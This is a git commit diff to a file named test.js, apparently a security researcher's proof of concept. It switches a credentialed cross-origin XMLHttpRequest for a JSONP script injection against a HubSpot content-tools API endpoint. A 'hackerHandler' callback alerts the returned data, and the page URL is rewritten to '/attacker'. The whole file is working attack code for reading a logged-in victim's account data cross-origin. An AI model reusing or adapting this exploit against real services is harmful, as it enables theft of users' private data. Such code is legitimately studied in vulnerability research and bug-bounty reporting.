f2c78d2ae8248326d070b4bb0485bfc5a065d360
Mohamed Mahmoudi <41636967+medmahmoudi26@users.noreply.github.com>
2022-02-03 10:57:32 +0100

    Update test.js

--- assets/javascript/test.js
+++ assets/javascript/test.js
@@ -1,13 +1,13 @@
 window.history.replaceState(null, '', '/attacker');
-var xhr = new XMLHttpRequest();
 
-xhr.withCredentials = true;
+function hackerHandler(e) {
+	alert(e);
+}
 
-xhr.onreadystatechange = function() {
-    if (xhr.readyState == XMLHttpRequest.DONE) {
-	alert(xhr.responseText);
-    }
-};
+o = document.createElement("script");
+o.type = "text/javascript";
+o.referrerPolicy = "no-referrer-when-downgrade";
+o.async = !0;
+o.src = "https://app-eu1.hubspot.com/content-tools-menu/api/v1/tools-menu/landing-pages/45875820775/actions?portalId=25502480&callback=hackerHandler";
 
-xhr.open("GET", "https://app-eu1.hubspot.com/content-tools-menu/api/v1/tools-menu/landing-pages/45875820775/actions?portalId=25502480&callback=jsonpHandler", true);
-xhr.send();
+
